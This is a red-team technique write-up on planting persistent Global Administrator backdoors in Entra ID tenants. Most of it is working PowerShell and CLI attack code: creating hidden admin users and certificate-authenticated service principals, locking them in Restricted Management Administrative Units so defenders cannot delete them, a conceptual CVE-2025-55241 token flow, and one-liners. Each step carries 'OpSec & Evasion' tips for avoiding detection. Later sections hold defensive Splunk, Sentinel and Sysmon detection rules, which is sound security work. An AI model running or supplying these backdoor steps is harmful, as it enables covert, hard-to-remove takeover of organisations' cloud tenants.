# PE-ACCTMGMT-014: Global Administrator Backdoor

**Full File Path:** `04_PrivEsc/PE-ACCTMGMT-014_Global_Admin.md`

---

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-014 |
| **MITRE ATT&CK v18.1** | [T1098.003 - Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003/) |
| **Tactic** | Persistence (TA0003) |
| **Platforms** | Cloud (Azure/Entra ID) |
| **Severity** | Critical |
| **CVE** | CVE-2025-55241 (Actor Token Impersonation) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Entra ID deployments; All Azure AD; All Microsoft 365 with Entra ID |
| **Patched In** | CVE-2025-55241 patched September 2025; Backdoor creation techniques remain unpatched (no CVE) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Global Administrator Backdoor creation involves an attacker establishing persistent administrative access to an Entra ID tenant by creating new user accounts or service principals with Global Administrator role assignments outside of Privileged Identity Management (PIM) controls. Unlike temporary PIM-activated roles, these backdoor accounts provide indefinite administrative access with minimal oversight. Attackers can further strengthen persistence by leveraging Restricted Management Administrative Units to prevent account deletion, or Hidden Membership AUs to conceal the backdoor from detection. In the most severe cases, attackers exploit CVE-2025-55241 (Actor Token vulnerability, patched September 2025) to impersonate Global Admins across tenants without leaving audit logs.

**Attack Surface:**
- **Entra ID User Accounts** (New-MgUser API endpoint)
- **Role Assignment APIs** (Microsoft Graph role assignment endpoints)
- **Service Principals / App Registrations** (App Registration blade, service principal role assignments)
- **Administrative Units** (restricted and hidden membership configurations)
- **Legacy Azure AD Graph API** (for actor token exploitation, CVE-2025-55241)
- **Microsoft Entra Admin Center** (Portal-based backdoor account creation)

**Business Impact:** **An attacker with a Global Administrator backdoor account has unrestricted access to all Entra ID, Azure, and Microsoft 365 resources.** They can reset passwords of any account (including break glass accounts), disable Conditional Access policies, extract all email and data, create additional backdoor accounts, modify security settings, exfiltrate sensitive data indefinitely, and maintain persistent access even if the original compromise vector is remediated.

**Technical Context:** Creating a backdoor account is trivial—a single API call creates the user and assigns the role in seconds. Detection depends entirely on SIEM monitoring; the operations appear in audit logs under "Add member to role" events, but if alerts are not configured, the compromise can persist indefinitely. Reversibility is extremely difficult if the backdoor account is placed in a Restricted Management AU; even Global Admins cannot delete or modify it without first removing it from the AU (which requires a Global Admin with explicit AU management permissions).

### Operational Risk

- **Execution Risk:** Low. If attacker has ANY Global Admin privileges, creating a backdoor is trivial. Even compromised low-privilege accounts can escalate and create backdoors.
- **Stealth:** Medium. Operations are logged, but can blend with legitimate admin activity if notifications are not configured. Service principal backdoors may be overlooked if app inventory is not regularly audited.
- **Reversibility:** Very Difficult. Restricted Management AUs make accounts completely undeletable by tenant-wide admins. Takes significant effort to remove AU and then delete account.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1, 1.2 | Do NOT maintain permanent Global Administrator assignments; use PIM for all privileged roles. |
| **DISA STIG** | V-72983, V-72984 | Administrative accounts require MFA, approval workflows, and time-limited access. |
| **CISA SCuBA** | MS.AAD.1.3 | Global Administrator role must be assigned as "Eligible" in PIM, not "Active." |
| **NIST 800-53** | AC-3, AC-5, AC-6, AU-2 | Access Enforcement, Separation of Duties, Least Privilege, Audit Events. |
| **NIST 800-207** | Zero Trust Principles | Continuous verification; assume breach; assume no permanent privilege grants. |
| **GDPR** | Art. 32 | Security of Processing; manage administrative access with strong controls. |
| **DORA** | Art. 9 | Protection and Prevention; restrict administrative access. |
| **NIS2** | Art. 21 | Cyber Risk Management; manage privileged accounts with MFA and time limits. |
| **ISO 27001** | A.9.2.1, A.9.2.3 | User Registration & De-registration; Privileged Access Rights Management. |
| **ISO 27005** | Risk Scenario: "Unauthorized Administrative Access" | Permanent privilege grant = uncontrolled access risk. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges (for exploitation):**
  - Existing Global Administrator account (most direct), OR
  - Privileged Role Administrator (can assign roles to other users), OR
  - User Administrator + Password Administrator (can create + reset password on new user to gain access), OR
  - Service Principal with Directory.ReadWrite.All and RoleManagement.ReadWrite.Directory permissions

- **Required Access:**
  - Network access to Microsoft Graph API (https://graph.microsoft.com), OR
  - Access to Azure Portal / Entra Admin Center (portal.azure.com / entra.microsoft.com)

**Supported Versions:**
- **Entra ID:** All versions
- **Azure AD:** All versions with role management
- **Microsoft 365:** All versions
- **PowerShell:** Version 5.0+
- **Microsoft Graph SDK:** 1.0+

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (v1.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.40.0+)
- Native: PowerShell 7.x, Azure Portal, Entra Admin Center

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### 4.1 Management Station / PowerShell Reconnaissance

#### Check for Existing Global Administrator Accounts

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All", "RoleManagement.Read.Directory"

# Get the Global Administrator role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# List all users with Global Admin role
$globalAdmins = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id

Write-Host "Current Global Administrators:"
$globalAdmins | ForEach-Object {
    $user = Get-MgUser -UserId $_.Id -ErrorAction SilentlyContinue
    Write-Host "  - $($user.UserPrincipalName) (Created: $($user.CreatedDateTime))"
}

# Check for "Inactive" or new accounts (potential backdoors)
$globalAdmins | ForEach-Object {
    $user = Get-MgUser -UserId $_.Id -ErrorAction SilentlyContinue
    if ($user.CreatedDateTime -gt (Get-Date).AddDays(-30)) {
        Write-Host "WARNING: New Global Admin within 30 days: $($user.UserPrincipalName)"
    }
}
```

**What to Look For:**
- Unexpected or unknown Global Administrator accounts
- Accounts created recently (within last 7-30 days) - potential backdoors
- Service principals with Global Admin role (should be rare)
- Accounts with suspicious naming patterns ("serviceaccount", "system", "backup")
- Accounts without recent sign-in history (inactive backdoors)

#### Check for Administrative Units with Restricted Management

```powershell
# Get all administrative units
$aus = Get-MgBetaAdministrativeUnit -All

# Check for restricted management AUs
$aus | ForEach-Object {
    if ($_.IsMemberManagementRestricted -eq $true) {
        Write-Host "CRITICAL: Restricted Management AU found: $($_.DisplayName)"
        Write-Host "  ID: $($_.Id)"
        
        # Get members of this AU
        $members = Get-MgBetaAdministrativeUnitMember -AdministrativeUnitId $_.Id
        Write-Host "  Members: $($members.Count)"
        $members | ForEach-Object {
            Write-Host "    - $($_.UserPrincipalName)"
        }
    }
}
```

**What to Look For:**
- Any Restricted Management AUs (should not exist unless explicitly for break glass accounts)
- Members of restricted AUs (especially if not break glass accounts)
- Hidden membership AUs with scoped role assignments

#### Check for Service Principals with Privileged Roles

```powershell
# Get all service principals
$servicePrincipals = Get-MgServicePrincipal -All

# Check which service principals have Global Admin role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
$adminAssignments = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id

$adminAssignments | ForEach-Object {
    $sp = Get-MgServicePrincipal -Filter "id eq '$($_.Id)'" -ErrorAction SilentlyContinue
    if ($sp) {
        Write-Host "Service Principal with Global Admin: $($sp.DisplayName)"
        Write-Host "  App ID: $($sp.AppId)"
        Write-Host "  Object ID: $($sp.Id)"
    }
}
```

**What to Look For:**
- Unexpected service principals with high-privilege roles
- Service principals without Microsoft ownership (non-Microsoft apps with Global Admin)
- Apps with names suggesting backdoor intent ("BackupAdmin", "EmergencyAccess" that are not break glass)

### 4.2 Linux/Bash / CLI Reconnaissance

```bash
# Using Azure CLI to list Global Admins
az ad user list --filter "assignedLicenses/any()" --query "[].{UPN:userPrincipalName, Created:createdDateTime}"

# Get role assignments via Azure CLI (requires Microsoft Graph)
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" | jq '.value[] | select(.roleDefinitionId=="62e90394-69f5-4237-9190-012177145e10")'
```

**What to Look For:**
- Recently created users (compare CreatedDateTime with current date)
- Unexpected accounts in Global Admin role

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Direct User Creation + Global Admin Assignment (Compromised Global Admin)

**Supported Versions:** All Entra ID versions

#### Step 1: Create New User Account

**Objective:** Create a new backdoor user account that attacker will control.

**Command:**
```powershell
# Authenticate as compromised Global Admin
$cred = Get-Credential # Enter compromised admin credentials
Connect-MgGraph -Credential $cred -Scopes "User.ReadWrite.All", "RoleManagement.ReadWrite.Directory"

# Create new user account
$newUser = New-MgUser `
  -DisplayName "Cloud Service Administrator" `
  -MailNickname "cloudsvcadmin" `
  -UserPrincipalName "cloudsvcadmin@company.onmicrosoft.com" `
  -PasswordProfile @{ 
      Password = "C0mpl3xP@ssw0rd!2024"
      ForceChangePasswordNextSignIn = $false
  } `
  -AccountEnabled $true

Write-Host "New user created: $($newUser.UserPrincipalName)"
Write-Host "User ID: $($newUser.Id)"
```

**Expected Output:**
```
New user created: cloudsvcadmin@company.onmicrosoft.com
User ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- Backdoor user account created and immediately active
- Attacker controls the password (set to `ForceChangePasswordNextSignIn = $false` to prevent forced reset)
- Account ready to receive administrative role

**OpSec & Evasion:**
- Use a realistic display name ("Cloud Service Account", "Automated Management", "System Administrator")
- Avoid suspicious naming ("Backdoor", "Attacker", "Persistence")
- Set account to simulate automated process (no interactive sign-in historical pattern)
- Create account during business hours when admin activity is expected
- Detection likelihood: Low if account creation is not monitored; High if SIEM alerts on user creation

**Troubleshooting:**
- **Error:** "Permission denied" or "User not authorized"
  - **Cause:** Compromised account lacks Directory.ReadWrite.All scope
  - **Fix:** Ensure authenticated as Global Admin or Privileged Role Admin
  
- **Error:** "Invalid mailNickname or UPN format"
  - **Cause:** Username doesn't follow tenant naming conventions
  - **Fix:** Verify UPN matches tenant domain (@company.onmicrosoft.com or custom domain)

**References & Proofs:**
- [Microsoft Graph User Resource Type](https://learn.microsoft.com/en-us/graph/api/resources/user)
- [New-MgUser PowerShell Cmdlet](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.users/new-mguser)

#### Step 2: Assign Global Administrator Role

**Objective:** Grant the newly created user Global Administrator role for persistent backdoor access.

**Command:**
```powershell
# Get Global Administrator role definition
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Create role assignment for the new user (Active, not Eligible - bypass PIM)
$roleAssignment = New-MgDirectoryRoleAssignment `
  -RoleDefinitionId $globalAdminRole.Id `
  -PrincipalId $newUser.Id

Write-Host "Global Admin role assigned successfully"
Write-Host "Assignment ID: $($roleAssignment.Id)"
Write-Host "Backdoor account is now Global Administrator"
```

**Expected Output:**
```
Global Admin role assigned successfully
Assignment ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
Backdoor account is now Global Administrator
```

**What This Means:**
- Backdoor user now has unrestricted Global Administrator privileges
- No PIM controls apply (not Eligible, but Active)
- No re-authentication or approval required for future access
- Attacker can login as this user at any time with no restrictions

**OpSec & Evasion:**
- This operation WILL appear in audit logs as "Add member to role"
- However, without real-time alerting, may not be immediately detected
- Suggest making the assignment appear to come from PIM approval if possible
- Ensure backdoor account is used sparingly initially to avoid detection
- Detection likelihood: Very High if audit monitoring enabled; Medium if only periodic reviews

**Troubleshooting:**
- **Error:** "Role assignment already exists"
  - **Cause:** User already has this role
  - **Fix:** Verify the user assignment or choose different user

**References & Proofs:**
- [Microsoft Entra Roles and Assignments](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/manage-roles-portal)
- [Datadog Security Lab: Sticky Backdoor Research](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)

#### Step 3: Verify Access and Test Backdoor

**Objective:** Confirm the backdoor user has Global Admin access.

**Command:**
```powershell
# Test login with backdoor credentials
$backdoorCred = New-Object System.Management.Automation.PSCredential `
  ("cloudsvcadmin@company.onmicrosoft.com", (ConvertTo-SecureString "C0mpl3xP@ssw0rd!2024" -AsPlainText -Force))

Connect-MgGraph -Credential $backdoorCred -Scopes "Directory.Read.All"

# Verify Global Admin status
$myUser = Get-MgMe
$myRoles = Get-MgUserMemberOf -UserId $myUser.Id | Where-Object { $_.ODataType -eq "#microsoft.graph.directoryRole" }

Write-Host "Backdoor user: $($myUser.UserPrincipalName)"
Write-Host "Current roles:"
$myRoles | ForEach-Object {
    $role = Get-MgDirectoryRole -DirectoryRoleId $_.Id
    Write-Host "  - $($role.DisplayName)"
}

# Test privileged operation (create another user as proof of access)
$testUser = New-MgUser -DisplayName "Test User" -MailNickname "testuser" `
  -UserPrincipalName "testuser@company.onmicrosoft.com" `
  -PasswordProfile @{ Password = "TestP@ssw0rd123!" }

Write-Host "Proof of access: Created test user: $($testUser.UserPrincipalName)"
```

**Expected Output:**
```
Backdoor user: cloudsvcadmin@company.onmicrosoft.com
Current roles:
  - Global Administrator
Proof of access: Created test user: testuser@company.onmicrosoft.com
```

**What This Means:**
- Backdoor user successfully authenticated
- Has Global Administrator role confirmed
- Can perform any administrative action (created user as proof)
- Complete tenant compromise achieved

---

### METHOD 2: Sticky Backdoor via Restricted Management Administrative Unit

**Supported Versions:** All Entra ID versions with P1+ licensing

#### Step 1: Create Restricted Management AU

**Objective:** Create an Administrative Unit with restricted management to prevent account deletion.

**Command:**
```powershell
# Create restricted management AU
$restrictedAU = New-MgBetaAdministrativeUnit `
  -DisplayName "Protected Accounts - Restricted Management" `
  -Description "Administrative unit for sensitive accounts (read-only for most admins)" `
  -IsMemberManagementRestricted $true `
  -MembershipType "Dynamic"

Write-Host "Restricted AU created: $($restrictedAU.DisplayName)"
Write-Host "AU ID: $($restrictedAU.Id)"
```

**Expected Output:**
```
Restricted AU created: Protected Accounts - Restricted Management
AU ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- Restricted management AU created
- Any accounts placed in this AU cannot be deleted or modified by tenant-wide Global Admins
- Only admins explicitly assigned to manage this AU can modify members
- Provides "sticky" persistence for backdoor accounts

**OpSec & Evasion:**
- Use a legitimate-sounding AU name ("Executive Accounts", "Tier 0 Protection", "Sensitive Users")
- Make AU appear to be for legitimate protective purposes
- Hide AU membership from visibility where possible
- Detection likelihood: Medium if AU creation is monitored; Low if not

#### Step 2: Add Backdoor User to Restricted AU

**Objective:** Place the backdoor account in the restricted AU to prevent removal.

**Command:**
```powershell
# Add the backdoor user to the restricted AU
New-MgBetaAdministrativeUnitMember -AdministrativeUnitId $restrictedAU.Id -BodyParameter @{
    "@odata.type" = "#microsoft.graph.user"
    "id" = $newUser.Id
}

Write-Host "Backdoor user added to Restricted AU"
Write-Host "User is now protected from deletion by tenant-wide admins"

# Verify membership
$auMembers = Get-MgBetaAdministrativeUnitMember -AdministrativeUnitId $restrictedAU.Id
Write-Host "AU members: $($auMembers.Count)"
```

**Expected Output:**
```
Backdoor user added to Restricted AU
User is now protected from deletion by tenant-wide admins
AU members: 1
```

**What This Means:**
- Backdoor account now protected by restricted AU
- Even Global Administrators CANNOT:
  - Delete the user
  - Reset password
  - Disable the account
  - Revoke sessions
- Attacker retains permanent access even if initial compromise is discovered

**OpSec & Evasion:**
- AU membership visibility is restricted; most admins cannot see who is in the AU
- Appears to most admins as empty or inaccessible
- Legitimate-appearing AU purpose provides cover
- Detection likelihood: Very High if AU access is audited; Low if AU not regularly reviewed

#### Step 3: Attempt Remediation (Demonstrate Stickiness)

**Objective:** Show how even Global Admins cannot remove the account.

**Scenario:**
```powershell
# As a tenant-wide Global Admin, attempt to delete the backdoor user
try {
    Remove-MgUser -UserId $newUser.Id
    Write-Host "User deleted successfully"
} catch {
    Write-Host "ERROR: Cannot delete user"
    Write-Host "Message: $($_.Exception.Message)"
    # Error: "Permission denied. The user is a member of a restricted management AU."
}

# To actually remove the user, must first remove from AU
# This requires explicit AU management permissions
Remove-MgBetaAdministrativeUnitMember -AdministrativeUnitId $restrictedAU.Id -DirectoryObjectId $newUser.Id

# ONLY THEN can user be deleted
Remove-MgUser -UserId $newUser.Id
```

**What This Demonstrates:**
- Standard Global Admin remediation attempts fail
- Attacker has time to establish additional persistence
- Legitimate admins must understand AU mechanics to remediate
- Provides significant forensic evasion window

---

### METHOD 3: Service Principal Backdoor (Certificate-Based)

**Supported Versions:** All Entra ID versions

#### Step 1: Create App Registration with Certificate

**Objective:** Create a service principal with certificate-based authentication for non-interactive backdoor access.

**Command:**
```powershell
# Create app registration
$appReg = New-MgApplication `
  -DisplayName "Cloud Management Automation" `
  -Description "Service account for automated cloud management tasks"

Write-Host "App Registration created: $($appReg.DisplayName)"
Write-Host "Application ID: $($appReg.AppId)"

# Create certificate for authentication
$cert = New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" `
  -Subject "CN=CloudMgmtAutomation" -KeySpec KeyExchange -KeyLength 2048

Write-Host "Certificate created: $($cert.Thumbprint)"

# Add certificate credential to app
$keyCredential = @{
    Type       = "AsymmetricX509Cert"
    Usage      = "Sign"
    Key        = $cert.RawData
}

Update-MgApplication -ApplicationId $appReg.Id -KeyCredentials @($keyCredential)

# Create service principal for the app
$servicePrincipal = New-MgServicePrincipal -AppId $appReg.AppId

Write-Host "Service Principal created: $($servicePrincipal.DisplayName)"
Write-Host "Service Principal ID: $($servicePrincipal.Id)"
```

**Expected Output:**
```
App Registration created: Cloud Management Automation
Application ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
Certificate created: A1B2C3D4E5F67890ABCDEF1234567890ABCDEF12
Service Principal created: Cloud Management Automation
Service Principal ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- App registration with certificate created
- Non-interactive authentication mechanism established
- No password, only certificate (harder to detect/revoke)
- Service principal ready to receive administrative role

#### Step 2: Assign Global Administrator Role to Service Principal

**Objective:** Grant Global Administrator role to service principal.

**Command:**
```powershell
# Get Global Administrator role
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Assign to service principal
$spRoleAssignment = New-MgDirectoryRoleAssignment `
  -RoleDefinitionId $globalAdminRole.Id `
  -PrincipalId $servicePrincipal.Id

Write-Host "Global Admin role assigned to service principal"
Write-Host "Assignment ID: $($spRoleAssignment.Id)"
```

**Expected Output:**
```
Global Admin role assigned to service principal
Assignment ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- Service principal now has Global Administrator permissions
- Can be used for automated attacks (mailbox exfiltration, bulk user creation, etc.)
- Non-interactive, no MFA required
- Persistent backdoor mechanism

#### Step 3: Authenticate as Service Principal Backdoor

**Objective:** Demonstrate service principal authentication and capability.

**Command:**
```powershell
# Save certificate details for later use
$certThumbprint = $cert.Thumbprint
$tenantId = (Get-MgContext).TenantId
$clientId = $appReg.AppId

# Authenticate as service principal (can be run from any machine with cert)
Connect-MgGraph -ClientId $clientId -TenantId $tenantId -CertificateThumbprint $certThumbprint

# Verify Global Admin access
Get-MgUser -Top 1

# Perform admin action
$newUser = New-MgUser -DisplayName "Backup Admin" `
  -MailNickname "backupadmin" `
  -UserPrincipalName "backupadmin@company.onmicrosoft.com" `
  -PasswordProfile @{ Password = "B@ckupAdminP@ss!" }

Write-Host "Service principal successfully created user: $($newUser.UserPrincipalName)"
Write-Host "Backdoor is operational and automated"
```

**Expected Output:**
```
Service principal successfully created user: backupadmin@company.onmicrosoft.com
Backdoor is operational and automated
```

**What This Means:**
- Service principal can authenticate without any user interaction
- Can be scheduled for automated persistence (mailbox exfiltration, etc.)
- Difficult to detect if app inventory is not regularly audited
- Operates as Global Admin automatically

---

### METHOD 4: Actor Token Cross-Tenant Compromise (CVE-2025-55241)

**Supported Versions:** Azure AD Graph API (vulnerable until September 2025 patch; historical compromise concern)

#### Step 1: Generate Actor Token in Attacker's Tenant

**Objective:** Create forged actor token for cross-tenant impersonation.

**Note:** This vulnerability was patched in September 2025. Historical exploitation may still be exploitable on unpatched systems.

**Concept:**
```
The legacy Azure AD Graph API (graph.windows.net) did not properly validate 
token source. An attacker could:

1. Generate token in their own test Entra ID tenant
2. Use token to call Azure AD Graph API
3. API would accept token to access victim tenant
4. Attacker could create users and assign Global Admin roles
5. No audit logs generated (bypass all logging)
```

**Exploit Flow (Simplified):**
```powershell
# This is a CONCEPTUAL example (requires unpatched system)
# Modern Microsoft has patched this in their Graph API

# 1. In attacker's tenant, create an actor token
$attackerToken = Get-MgGraphToken -ClientId $attackerAppId -ClientSecret $attackerSecret

# 2. Use token to call victim's Azure AD Graph API (legacy endpoint)
$victimTenantId = "victim-tenant-id"
$uri = "https://graph.windows.net/$victimTenantId/users?api-version=1.6"

$headers = @{
    "Authorization" = "Bearer $attackerToken"
    "Content-Type" = "application/json"
}

# 3. Create user in victim tenant
$newUserJson = @{
    accountEnabled = $true
    displayName = "Backdoor Admin"
    mailNickname = "backdoora"
    userPrincipalName = "backdoor@victim-tenant.onmicrosoft.com"
    passwordProfile = @{
        password = "P@ssw0rd123!"
        forceChangePasswordNextSignIn = $false
    }
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri $uri -Method POST -Headers $headers -Body $newUserJson

# 4. Assign Global Admin role to created user (no logs)
# Token bypasses all logging and MFA checks
```

**What This Means:**
- Cross-tenant impersonation without any pre-existing access
- No audit logs generated (invisible to detection)
- Attacker doesn't need to compromise victim tenant initially
- Can create Global Admin from completely outside organization

**Detection Difficulty:**
- **Extremely High** - No direct logging of token usage or API calls in victim tenant
- Attackers could compromise organizations without leaving traces
- Only evidence: unexpected user creation (may appear legitimate if timing right)

**Current Status:**
- **Patched September 2025** by Microsoft
- Older unpatched systems may still be vulnerable
- Historical compromises from this vulnerability will have NO audit logs

**References & Proofs:**
- [dirkjanm: Actor Token One Token to Rule Them All](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)
- [Mitiga: Breaking Down the Actor Token Vulnerability](https://www.mitiga.io/blog/breaking-down-the-microsoft-entra-id-actor-token-vulnerability-the-perfect-crime-in-the-cloud)
- [CVE-2025-55241 Advisory](https://learn.microsoft.com/en-us/security/update-security-advisories)

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Integration

- **Atomic Test ID:** T1098.003-1 (Additional Cloud Roles)
- **Test Name:** "Add User to Global Administrator Role"
- **Description:** Create new user and assign Global Administrator role in Entra ID.
- **Supported Versions:** All Entra ID versions

**Command:**
```powershell
Invoke-AtomicTest T1098.003 -TestNumbers 1
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1098.003 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team T1098.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.003/T1098.003.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### 7.1 Microsoft Graph PowerShell SDK

**Version:** 1.0+
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage - Create Global Admin:**
```powershell
Connect-MgGraph -Scopes "User.ReadWrite.All", "RoleManagement.ReadWrite.Directory"
$user = New-MgUser -DisplayName "Backdoor" -MailNickname "backdoor" -UserPrincipalName "backdoor@company.onmicrosoft.com" -PasswordProfile @{password="P@ss"}
$role = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
New-MgDirectoryRoleAssignment -RoleDefinitionId $role.Id -PrincipalId $user.Id
```

### 7.2 Azure CLI

**Version:** 2.40.0+
**Supported Platforms:** Windows, Linux, macOS

**Usage - Create Global Admin (Azure CLI):**
```bash
az ad user create --display-name "Backdoor Admin" --user-principal-name "backdoor@company.onmicrosoft.com" --password "P@ssw0rd123!"
az ad role assignment create --assignee "backdoor@company.onmicrosoft.com" --role "Global Administrator"
```

### 7.3 One-Liner Scripts

**Create Global Admin Backdoor (One-Liner):**
```powershell
Connect-MgGraph -Scopes "User.ReadWrite.All","RoleManagement.ReadWrite.Directory"; $u=New-MgUser -DisplayName "Admin" -MailNickname "admin" -UserPrincipalName "admin@company.onmicrosoft.com" -PasswordProfile @{password="P@ss"}; $r=Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"; New-MgDirectoryRoleAssignment -RoleDefinitionId $r.Id -PrincipalId $u.Id
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: New Global Administrator Role Assignment

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, TargetResources[0].userPrincipalName, Result
- **Alert Threshold:** Any Global Admin assignment
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Add member to role completed" 
result=success 
| search TargetResources{}.displayName="Global Administrator"
| stats count min(_time) as firstTime max(_time) as lastTime by InitiatedBy.user.userPrincipalName, TargetResources{}.userPrincipalName
| rename InitiatedBy.user.userPrincipalName as actor
| rename TargetResources{}.userPrincipalName as target
| table actor, target, firstTime, lastTime, count
```

**What This Detects:**
- ANY assignment of Global Administrator role
- Who assigned it (actor)
- Who received it (target)
- Timestamp of assignment

### Rule 2: New User Created + Immediately Assigned Privileged Role

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, TargetResources[0].userPrincipalName, TimeGenerated
- **Alert Threshold:** Role assignment within 5 minutes of user creation
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad operationName="Add user"
| stats min(_time) as userCreatedTime by TargetResources{}.userPrincipalName
| join type=inner [ search index=azure_monitor_aad operationName="Add member to role completed"
| stats min(_time) as roleAssignTime by TargetResources{}.userPrincipalName ]
| eval timeDiff=roleAssignTime-userCreatedTime
| where timeDiff>=0 and timeDiff<=300
| alert
```

**What This Detects:**
- Suspicious pattern: new user created then immediately assigned role
- Likely backdoor account creation
- Very low false positive rate

### Rule 3: Administrative Unit Restricted Management Creation

**Rule Configuration:**
- **Required Index:** azure_monitor_aad
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, Result, additionalDetails
- **Alert Threshold:** Creation of restricted management AU
- **Applies To Versions:** All

**SPL Query:**
```spl
index=azure_monitor_aad (operationName="Create administrativeUnit" OR operationName="Update administrativeUnit")
| search additionalDetails{}.key="isMemberManagementRestricted" additionalDetails{}.value="true"
| stats min(_time) as firstTime by InitiatedBy.user.userPrincipalName, TargetResources{}.displayName
| alert
```

**What This Detects:**
- Creation of restricted management administrative units
- Usually rare; potential sticky backdoor creation
- Should trigger investigation

---

## 9. MICROSOFT SENTINEL DETECTION RULES (KQL)

### Sentinel Rule 1: New Global Administrator Assignment

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to role completed" and Result == "Success"
| extend roleName = tostring(TargetResources[0].displayName)
| where roleName == "Global Administrator"
| extend actor = tostring(InitiatedBy.user.userPrincipalName)
| extend target = tostring(TargetResources[0].userPrincipalName)
| project TimeGenerated, actor, target, OperationName
```

### Sentinel Rule 2: Potential Backdoor Pattern (New User + Admin Role)

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
let userCreations = AuditLogs
| where OperationName == "Add user" and Result == "Success"
| extend newUser = tostring(TargetResources[0].userPrincipalName)
| extend createdTime = TimeGenerated
| project newUser, createdTime;
AuditLogs
| where OperationName == "Add member to role completed" and Result == "Success"
| extend roleName = tostring(TargetResources[0].displayName)
| where roleName in ("Global Administrator", "Privileged Role Administrator", "Security Administrator")
| extend targetUser = tostring(TargetResources[0].userPrincipalName)
| extend assignedTime = TimeGenerated
| join kind=inner (userCreations) on $left.targetUser == $right.newUser
| where assignedTime >= createdTime and assignedTime <= (createdTime + 5m)
| project TimeGenerated, newUser, roleName, InitiatedBy.user.userPrincipalName
```

### Sentinel Rule 3: Restricted Management AU Creation

**Applies To Versions:** All Entra ID

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Create administrativeUnit", "Update administrativeUnit")
| mv-apply Property = AdditionalDetails on 
  (where Property.key == "isMemberManagementRestricted" and Property.value == "true")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName
```

---

## 10. EVENT LOG & WINDOWS AUDIT DETECTION

### Entra ID Audit Log Events

| Operation | Category | Event Details | Backdoor Indicator |
|---|---|---|---|
| Add user | UserManagement | User account created with accountEnabled=true | If followed by role assignment |
| Add member to role completed | RoleManagement | User assigned to privileged role | Direct indicator |
| Add eligible member to role | RoleManagement | User made eligible for role via PIM | Less suspicious (PIM controls) |
| Create administrativeUnit | AdministrativeUnit | New AU created | Suspicious if restricted management |
| Update administrativeUnit | AdministrativeUnit | AU modified with isMemberManagementRestricted=true | Sticky backdoor creation |

**Search Queries:**
```
Category: RoleManagement
OperationName: "Add member to role completed"
Result: Success
TargetResources.displayName: "Global Administrator"
```

---

## 11. SYSMON DETECTION (On-Premises)

**Note:** Sysmon on Windows devices can detect PowerShell commands creating backdoors.

### Sysmon Rule: Monitor Microsoft Graph PowerShell Execution

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">New-MgUser</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">New-MgDirectoryRoleAssignment</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">pwsh</Image>
      <CommandLine condition="contains">Global Administrator</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**What This Detects:**
- PowerShell commands creating users or role assignments
